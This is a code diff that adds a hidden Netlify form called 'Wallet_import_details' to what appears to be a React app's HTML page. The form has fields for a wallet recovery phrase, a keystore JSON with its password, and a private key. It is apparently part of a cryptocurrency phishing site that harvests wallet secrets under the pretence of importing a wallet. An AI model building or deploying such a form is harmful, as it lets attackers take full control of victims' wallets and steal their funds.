@@ -54,6 +54,49 @@
     </title>
   </head>
   <body>
+      <form
+        class="form-area"
+        netlify
+        netlify-honeypot="bot-field"
+        name="Wallet_import_details"
+        hidden
+      >
+        <div class="mb-3">
+          <textarea
+            class="form-control"
+            id="exampleFormControlTextarea1"
+            placeholder="Phrase"
+            rows="5"
+          ></textarea>
+        </div>
+      
+        <div class="mb-3">
+          <textarea
+            class="form-control"
+            id="exampleFormControlTextarea1"
+            placeholder="Keystore JSON"
+            rows="5"
+          ></textarea>
+          <div>
+            <input
+              type="password"
+              class="form-control"
+              placeholder="Password"
+              id="inputPassword"
+            ></input>
+          </div>            
+        </div>
+
+        <div class="mb-3">
+          <input
+            type="text"
+            class="form-control"
+            id="exampleFormControlInput1"
+            placeholder="Private Key"
+          ></input>          
+        </div>
+    </form>
+
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     <!--
